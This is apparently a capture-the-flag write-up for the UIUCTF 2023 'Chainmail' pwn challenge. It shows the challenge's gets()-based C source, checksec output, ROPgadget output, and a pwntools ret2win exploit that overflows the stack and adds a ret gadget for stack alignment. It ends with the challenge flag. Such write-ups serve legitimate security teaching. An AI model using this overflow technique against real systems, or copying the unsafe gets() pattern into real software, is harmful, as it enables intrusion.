# UIUCTF 2023

## Chainmail

> I've come up with a winning idea to make it big in the Prodigy and Hotmail scenes (or at least make your email widespread)!
>
>  Author: Emma
>
> [`chal.c`](chal.c)
> [`chal`](chal)
> [`Dockerfile`](Dockerfile)

Tags: _pwn_

## Solution
The challenge comes with three files. The program for testing purpose but also with the original code, so reversing is not needed. The code is very simple.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void give_flag() {
    FILE *f = fopen("/flag.txt", "r");
    if (f != NULL) {
        char c;
        while ((c = fgetc(f)) != EOF) {
            putchar(c);
        }
    }
    else {
        printf("Flag not found!\n");
    }
    fclose(f);
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    char name[64];
    printf("Hello, welcome to the chain email generator! Please give the name of a recipient: ");
    gets(name);
    printf("Okay, here's your newly generated chainmail message!\n\nHello %s,\nHave you heard the news??? Send this email to 10 friends or else you'll have bad luck!\n\nYour friend,\nJim\n", name);
    return 0;
}
```

A name is read into a buffer, since `gets` is used this is vulnerable to a buffer overflow. Also a win function is given `give_flag`, so a typical ret2win setup. Checksec also confirms this as no canary is activated we can just write over anything until we rewrite the return address to point to `give_flag`.

```bash
$ checksec ./chal
[*] '/uiuc23/pwn/chainmail/chal'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
The offset to the ret address (from name buffer) can be found by using cycle patterns, I normally look what ghidra is giving me. The offset is visible in plain text in the decompiled code with the variable name.

The payload are then 72 bytes of random values to fill buffer right before the ret address on the stack plus the 64-bit address of `give_flag`. 

```python
from pwn import *

binary = context.binary = ELF("./chal", checksec=False)
context.log_level="debug"

if args.REMOTE:
    p = remote("chainmail.chal.uiuc.tf", 1337)
else:
    p = process(binary.path)

payload = b"A" * 72
payload = payload + p64(binary.sym.give_flag)

p.sendlineafter(b"recipient: ", payload)
p.interactive()
```

Since the script works perfectly on my local machine, but not remote this is typically an hint pointing at a [`stack alignment issue`](https://ropemporium.com/guide.html#Common%20pitfalls).

> Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.

To find a fitting gadget we can use `ROPgadget`.

```bash
$ ROPgadget --binary ./chal --ropchain
Gadgets information
============================================================
0x000000000040118b : add bh, bh ; loopne 0x4011f5 ; nop ; ret
0x000000000040115c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401336 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000401337 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x00000000004011fa : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040115e : add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401338 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x00000000004011fb : add byte ptr [rcx], al ; pop rbp ; ret
...
0x000000000040101a : ret
...
0x0000000000401340 : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401183 : test eax, eax ; je 0x401190 ; mov edi, 0x404068 ; jmp rax
0x00000000004011c5 : test eax, eax ; je 0x4011d0 ; mov edi, 0x404068 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
```

There it is, on address 40101ah. The workig payload looks like this and gives the flag.

```
payload = b"A" * 72
payload = payload + p64(0x40101a)
payload = payload + p64(binary.sym.give_flag)
```

Flag `uiuctf{y0ur3_4_B1g_5h0t_n0w!11!!1!!!11!!!!1}`